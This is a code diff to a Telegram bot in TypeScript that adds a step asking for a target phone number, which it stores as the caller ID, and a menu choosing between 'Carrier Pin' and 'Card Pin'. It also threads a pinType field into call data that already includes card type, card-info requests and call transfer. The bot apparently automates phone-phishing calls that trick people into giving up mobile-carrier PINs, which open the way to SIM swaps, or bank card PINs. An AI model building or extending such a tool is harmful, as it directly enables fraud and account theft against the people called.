@@ -130,6 +130,30 @@ export const steps = (step: string): Array<Middleware<C>> => [
         },
       ]
     : []),
+  ...(step === 'pin'
+    ? [
+        async (ctx: any) => {
+          if (!validateNumber(ctx.message.text)) {
+            await ctx.replyWithHTML(
+              `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\nThe number should be in international format withour the + sign\n\ne.g <b>18882019292 or 447418360509</b>`,
+            );
+            return;
+          }
+          await ctx.replyWithHTML(
+            `🔐 Select pin type\n\n<i>***request will expire in 2 minutes***</i>\n\n<b><i>~ ${step.replace(
+              /^./,
+              step[0].toUpperCase(),
+            )} ~</i></b>`,
+            Markup.inlineKeyboard([
+              Markup.button.callback('Carrier Pin', 'carrierPin'),
+              Markup.button.callback('Card Pin', 'cardPin'),
+            ]),
+          );
+          ctx.wizard.state.callData.callerId = ctx.message.text;
+          return ctx.wizard.next();
+        },
+      ]
+    : []),
   ...(step === 'account'
     ? [
         async (ctx: any) => {
@@ -227,6 +251,7 @@ export const steps = (step: string): Array<Middleware<C>> => [
       cardType,
       askCardInfo,
       transferNumber,
+      pinType,
     } = ctx.wizard.state.callData;
 
     await ctx.replyWithHTML(
@@ -259,6 +284,7 @@ export const steps = (step: string): Array<Middleware<C>> => [
       cardType,
       askCardInfo,
       chatId,
+      pinType,
     });
 
     return ctx.wizard.next();
